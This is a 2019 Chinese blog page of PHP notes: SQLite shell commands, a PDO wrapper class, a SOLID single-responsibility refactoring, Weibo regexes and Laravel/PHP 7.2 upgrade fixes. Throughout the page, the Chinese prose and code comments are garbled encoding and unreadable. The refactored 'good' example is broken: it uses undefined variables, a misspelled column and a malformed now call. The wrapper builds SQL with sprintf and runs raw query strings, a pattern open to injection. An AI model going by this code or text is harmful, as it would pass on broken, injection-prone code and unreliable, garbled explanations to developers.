                <a class="post-title-link" href="/2019/05/13/php-è®°å½•/" itemprop="url">php è®°å½•</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-05-13T10:34:43+08:00">
                2019-05-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  20.2k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  98 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="php-sqlite"><a href="#php-sqlite" class="headerlink" title="php sqlite"></a>php sqlite</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"># -- æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¿¡æ¯</span><br><span class="line">sqlite&gt; .database</span><br><span class="line"></span><br><span class="line"># -- æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨çš„ä¿¡æ¯</span><br><span class="line"># å¯é€‰å‚æ•° ? table name , å¦‚æœåŠ ä¸Šè¿™ä¸ªå‚æ•°, ä¼šæŒ‰ç…§è¾“å…¥çš„è¡¨é¢å»æ˜¾ç¤º, æ”¯æŒ LIKE æ–¹å¼æŸ¥æ‰¾</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">sqlite&gt; .tables %persion%</span><br><span class="line"></span><br><span class="line"># -- åˆ›å»ºä¸€ä¸ªè¡¨</span><br><span class="line">sqlite&gt; CREATE TABLE persions (</span><br><span class="line">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        name text,</span><br><span class="line">        age int);</span><br><span class="line"></span><br><span class="line"># -- åˆ é™¤ä¸€ä¸ªè¡¨</span><br><span class="line">sqlite&gt; drop table persions;</span><br><span class="line"></span><br><span class="line"># -- ä¿®æ”¹è¡¨å</span><br><span class="line">sqlite&gt; ALTER TABLE persions RENAME TO persions2;</span><br><span class="line"># æŸ¥çœ‹ä¿®æ”¹ç»“æœ</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line"># å†æ”¹å›å»,ä¸è¦å½±å“åé¢çš„å‘½ä»¤</span><br><span class="line">sqlite&gt; ALTER TABLE persions2 RENAME TO persions;</span><br><span class="line"></span><br><span class="line"># -- æŸ¥çœ‹è¡¨ç»“æ„</span><br><span class="line">sqlite&gt; pragma table_info (<span class="string">'persions'</span>);</span><br><span class="line"></span><br><span class="line"># -- ä¿®æ”¹å­—æ®µ, SQLite ä¸èƒ½åƒä¸»æµæ•°æ®åº“é‚£æ ·ç›´æ¥ä¿®æ”¹å­—æ®µ, åªèƒ½æ·»åŠ ä¸€ä¸ªæ–°çš„å­—æ®µ</span><br><span class="line">#    å¦‚æœå¿…é¡»è¦ä¿®æ”¹,å¯ä»¥å…ˆå°†è¡¨é‡å‘½åä¸€ä¸ªå…¶ä»–çš„,å†å°†æ•°æ®æ’å…¥å³å¯</span><br><span class="line"># æ·»åŠ æ–°å­—æ®µ</span><br><span class="line">sqlite&gt; ALTER TABLE persions ADD COLUMN address text;</span><br><span class="line"></span><br><span class="line"># -- æ·»åŠ æ•°æ®, è§„åˆ™å’Œ MYSQL å¾ˆç±»ä¼¼</span><br><span class="line"># æ–¹å¼1</span><br><span class="line">sqlite&gt; INSERT INTO persions(name,age,address) VALUES (<span class="string">'å¼ ä¸‰'</span>,<span class="number">25</span>,<span class="string">'åŒ—äº¬'</span>);</span><br><span class="line"># æ–¹å¼2 ä¸æ¨è,å¦‚æœä½¿ç”¨è¿™ç§æ–¹å¼, å°±è¦å­—æ®µå’Œè¡¨çš„å­—æ®µæ•°é‡å®Œå…¨ç›¸åŒ</span><br><span class="line">sqlite&gt; INSERT INTO persions VALUES (<span class="number">2</span>,<span class="string">'æå››'</span>,<span class="number">30</span>,<span class="string">'å¤©æ´¥'</span>);</span><br><span class="line"># æ–¹å¼3 ä¸€èˆ¬ä¸ä¼šç”¨,å‘è¡¨ä¸­æ’å…¥é»˜è®¤å€¼,å¦‚æœæ²¡æœ‰æŒ‡å®šé»˜è®¤å€¼,å°±å†™å…¥ NULL</span><br><span class="line">sqlite&gt; INSERT INTO persions DEFAULT VALUES;</span><br><span class="line"></span><br><span class="line"># -- æ›´æ–°æ•°æ®</span><br><span class="line">sqlite&gt; UPDATE persions SET name=<span class="string">'æå››'</span>,age=<span class="number">22</span>,address=<span class="string">'ä¸Šæµ·'</span> WHERE id=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"># -- æŸ¥è¯¢æ•°æ®</span><br><span class="line">sqlite&gt; SELECT id,name,age,address FROM persions;</span><br><span class="line"></span><br><span class="line"># -- åˆ é™¤æ•°æ®</span><br><span class="line">sqlite&gt; DELETE FROM persions WHERE id=<span class="number">3</span>;</span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªä¸“é—¨å¤„ç† SQLite çš„ PDOç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sqlite</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $pdo;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$pdo = null</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º PDO_SQLITE DSN</span></span><br><span class="line">        <span class="keyword">if</span> ($pdo) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;pdo = $pdo;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:/home/bro/www/temp/test.sq3'</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">                echo <span class="string">'æ•°æ®åº“è¿æ¥å¤±è´¥: '</span> . $e-&gt;getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æµ‹è¯•çš„æ—¶å€™å°†é”™è¯¯æç¤ºæ‰“å¼€,å¦åˆ™å‡ºé”™äº†ä¸æ¸…æ¥šæ€ä¹ˆå›äº‹</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;pdo-&gt;setAttribute($<span class="keyword">this</span>-&gt;pdo::ATTR_ERRMODE, $<span class="keyword">this</span>-&gt;pdo::ERRMODE_EXCEPTION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢æ‰€æœ‰æ•°æ®</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pdo-&gt;query($sql)-&gt;fetchAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ’å…¥ä¸€æ¡æ•°æ®</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">insertOneData</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pdo-&gt;prepare($sql)-&gt;execute();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å®šä¹‰ä¸€ä¸ªæ‰“å°ç»“æœçš„å‡½æ•°</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params">$val, $title = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($title) &#123;</span><br><span class="line">        echo <span class="string">"&lt;br&gt;&lt;br&gt;&lt;h3&gt;&#123;$title&#125;&lt;/h3&gt;&lt;hr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    echo <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">    var_dump($val);</span><br><span class="line">    echo <span class="string">'&lt;/pre&gt;&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sqlite = <span class="keyword">new</span> Sqlite; <span class="comment">//new ä¸€ä¸ªSqliteå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥è¯¢æ‰€æœ‰æ•°æ®https://broqiang.com/posts/linux-php-sqlite</span></span><br><span class="line">$sqlQueryAll = <span class="string">"select * from persions"</span>;</span><br><span class="line"></span><br><span class="line">$allData = $sqlite-&gt;fetchAll($sqlQueryAll);</span><br><span class="line"></span><br><span class="line">p($allData,<span class="string">'æ‰€æœ‰æŸ¥è¯¢ç»“æœ'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ’å…¥ä¸€æ¡æ•°æ®</span></span><br><span class="line">$sqlInsertOneData = sprintf(<span class="string">"INSERT INTO persions(name,age,address) VALUES ('%s',%d,'%s');"</span>,<span class="string">'å¼ ä¸‰'</span>,<span class="number">25</span>,<span class="string">'åŒ—äº¬'</span>);</span><br><span class="line"></span><br><span class="line">p($sqlite-&gt;insertOneData($sqlInsertOneData) ? <span class="string">'æ’å…¥æˆåŠŸ'</span> : <span class="string">'æ’å…¥å¤±è´¥'</span>,<span class="string">'æ’å…¥ä¸€æ¡æ•°æ®'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="S-O-I-L-D-ä¹‹å•ä¸€èŒè´£"><a href="#S-O-I-L-D-ä¹‹å•ä¸€èŒè´£" class="headerlink" title="S.O.I.L.D ä¹‹å•ä¸€èŒè´£"></a>S.O.I.L.D ä¹‹å•ä¸€èŒè´£</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Acme\Reporting;</span><br><span class="line"></span><br><span class="line">use Auth;</span><br><span class="line">use DB;</span><br><span class="line">use Exception;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalesReporter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–æŸä¸ªæ—¶é—´æ®µçš„é”€å”®æ€»é¢</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param  $startDate</span></span><br><span class="line"><span class="comment">     * @param  $endDate  </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @return string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params">$startDate, $endDate</span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Auth::check()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'Authentication required for reporting'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sales = $<span class="keyword">this</span>-&gt;queryDBForSalesBetween($startDate, $endDate);</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;format($sales);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥è¯¢é”€å”®æŠ¥è¡¨æ•°æ®</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param  $startDate </span></span><br><span class="line"><span class="comment">     * @param  $endDate  </span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     * @return float         </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">queryDBForSalesBetween</span>(<span class="params">$startDate, $endDate</span>) : <span class="title">float</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DB::table(<span class="string">'sales'</span>)-&gt;whereBetween(<span class="string">'created_at'</span>, [$startDate, $endDate])-&gt;sum(<span class="string">'charge'</span>) / <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•°æ®å±•ç¤º</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param  $sales</span></span><br><span class="line"><span class="comment">     * @return string     </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">$sales</span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;h1&gt;Sales: $sales&lt;/h1&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æµ‹è¯•</span><br><span class="line"></span><br><span class="line">$report = <span class="keyword">new</span> Acme\Reporting\SalesReporter();</span><br><span class="line">$report-&gt;between(</span><br><span class="line">    now()-&gt;subDays(<span class="number">10</span>), </span><br><span class="line">    now()</span><br><span class="line">);</span><br><span class="line">è¯¥ä¾‹å­æ˜æ˜¾è¿åäº†å•ä¸€èŒè´£:</span><br><span class="line"></span><br><span class="line">æˆæƒæ–¹å¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¦‚ API æˆæƒï¼Œéœ€è¦æ”¹åŠ¨è¯¥ç±»</span><br><span class="line">å½“æ•°æ®åº“å±‚å‘ç”Ÿå˜åŒ–æ—¶å€™ï¼Œå¦‚ä½¿ç”¨ Redis æ—¶ï¼Œéœ€è¦æ”¹åŠ¨è¯¥ç±»</span><br><span class="line">å½“å±•ç¤ºæ–¹å¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œéœ€è¦æ”¹åŠ¨è¯¥ç±»</span><br><span class="line">æ­£é¢ç¤ºä¾‹</span><br><span class="line"></span><br><span class="line">å¯¹äºä¸Šè¿°çš„ä¾‹å­ï¼Œåº”å½“ä½œå‡ºå¦‚ä¸‹çš„æ”¹åŠ¨ï¼š</span><br><span class="line"></span><br><span class="line">ä¸éœ€è¦å…³å¿ƒç”¨æˆ·æˆæƒï¼Œç”¨æˆ·æˆæƒä¸æœ¬ç±»çš„èŒè´£æ— å…³</span><br><span class="line">æ•°æ®å±‚åº”å½“å‰¥ç¦»å‡ºæ¥</span><br><span class="line">å±•ç¤ºå±‚åº”å½“å‰¥ç¦»å‡ºæ¥</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// å±•ç¤ºå±‚æ¥å£</span></span><br><span class="line">interface SalesOutputInterface &#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// å±•ç¤ºå±‚å®ç°</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">HtmlOutput</span> <span class="title">implements</span> <span class="title">SalesOutputInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$sales</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;h1&gt;&#123;$sales&#125;&lt;/h1&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°æ®å±‚</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalesRepository</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DB::table(<span class="string">'sales'</span>)-&gt;whereBetween(<span class="string">'create_at'</span>, [$startDate, $endDate])-&gt;sum(<span class="string">'charge'</span>) / <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// èŒè´£ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalsReporter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    public $repo;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$repo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;repo = $repo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params">$startDate, $endDate, SalesOutputInterface $formater</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sales = $<span class="keyword">this</span>-&gt;repo-&gt;between($startDate, $endDate);</span><br><span class="line">        $formater-&gt;output($sales);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æµ‹è¯•</span><br><span class="line"></span><br><span class="line">$report = <span class="keyword">new</span> SalsReporter(<span class="keyword">new</span> SalesRepository);</span><br><span class="line">$report-&gt;between(</span><br><span class="line">    now-&gt;subDays(<span class="number">10</span>), </span><br><span class="line">    now(),</span><br><span class="line">    <span class="keyword">new</span> HtmlOutput</span><br><span class="line">);</span><br><span class="line">ç»“åˆ Laravel çš„ä¾èµ–æ³¨å…¥ï¼Œå¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–https:<span class="comment">//learnku.com/articles/27923#topnav</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalsReporter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    public $repo;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">SalesRepository $repo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;repo = $repo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params">$startDate, $endDate, SalesOutputInterface $formater</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sales = $<span class="keyword">this</span>-&gt;repo-&gt;between($startDate, $endDate);</span><br><span class="line">        $formater-&gt;output($sales);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/27953</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¸å¾®åšå†…å®¹åˆ†æç›¸å…³çš„æ­£åˆ™è¡¨è¾¾å¼"><a href="#ä¸å¾®åšå†…å®¹åˆ†æç›¸å…³çš„æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ä¸å¾®åšå†…å®¹åˆ†æç›¸å…³çš„æ­£åˆ™è¡¨è¾¾å¼"></a>ä¸å¾®åšå†…å®¹åˆ†æç›¸å…³çš„æ­£åˆ™è¡¨è¾¾å¼</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å¾®åšè¡¨æƒ…\[[\u4e00-\u9fa5A-Za-z]&#123;<span class="number">1</span>,<span class="number">8</span>&#125;\]</span><br><span class="line">å¾®åšæ˜µç§°@[\u4e00-\u9fa5A-Z0<span class="number">-9</span>a-z_-]&#123;<span class="number">2</span>,<span class="number">30</span>&#125;</span><br><span class="line">å¾®åšè¯é¢˜#[^@&lt;&gt;#"&amp;'\r\n\t]&#123;1,49&#125;#</span><br><span class="line">å¾®åšçŸ­é“¾æ¥#https&#123;0,1&#125;://t.cn/[A-Z0-9a-z]&#123;6,8&#125;[/]&#123;0,1&#125;#</span><br><span class="line">ç½‘å€é•¿é“¾æ¥(https?|ftp|file):<span class="comment">//[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]</span></span><br><span class="line">https:<span class="comment">//www.playpi.org/2018121101.html</span></span><br></pre></td></tr></table></figure>
<h3 id="Warning-count-Parameter-must-be-an-array-or-an-object"><a href="#Warning-count-Parameter-must-be-an-array-or-an-object" class="headerlink" title="Warning: count(): Parameter must be an array or an object"></a>Warning: count(): Parameter must be an array or an object</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PHP7<span class="number">.2</span>ä¸­è¿™æ ·å†™https:<span class="comment">//segmentfault.com/a/1190000017268206</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo count(<span class="literal">null</span>);</span><br><span class="line">ä¼šæŠ¥ä»¥ä¸‹é”™è¯¯ï¼š</span><br><span class="line"></span><br><span class="line">Warning: count(): Parameter must be an array or an object that implements Countable <span class="keyword">in</span> </span><br><span class="line">ä½†åœ¨PHP7<span class="number">.1</span>ä»¥ä¸‹</span><br><span class="line">ä¼šè¿”å›<span class="number">0</span></span><br><span class="line">æ‰€ä»¥è¿™æ¬¡å°±å‘äº†è‡ªå·±æœ€ç»ˆåˆä»PHP7<span class="number">.2</span>é™å›<span class="number">7.1</span> php artisan -V æŸ¥çœ‹Laravelç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">laravel <span class="number">5.4</span>å’Œ<span class="number">5.6</span>çš„æ—¥å¿—æ˜¯æœ‰åŒºåˆ«çš„</span><br><span class="line">æ‰€ä»¥éœ€è¦åœ¨configä¸‹æ·»åŠ ä¸€ä¸ªlogging.phpçš„é…ç½®æ–‡ä»¶ï¼Œä»£ç è¯·å¤åˆ¶é‡Œé¢</span><br><span class="line">https:<span class="comment">//github.com/laravel/laravel/blob/develop/config/logging.php</span></span><br><span class="line">http:<span class="comment">//wangyapeng.me/2019/01/13/upgrad-laravel-5.5-to-5.7-log/ </span></span><br><span class="line">ç„¶ååœ¨.envä¸‹æ·»åŠ LOG_CHANNEL=stackè¿™æ ·æ—¥å¿—å°±ä¸ä¼šæŠ¥é”™äº†</span><br><span class="line">åœ¨ .env åˆ é™¤ APP_DEBUG_LEVELï¼Œæ–°å¢ LOG_CHANNEL=stack</span><br><span class="line">åœ¨ config/app.php å†…åˆ é™¤ log å’Œ log_level ä¸¤ä¸ªå­—æ®µ</span><br></pre></td></tr></table></figure>
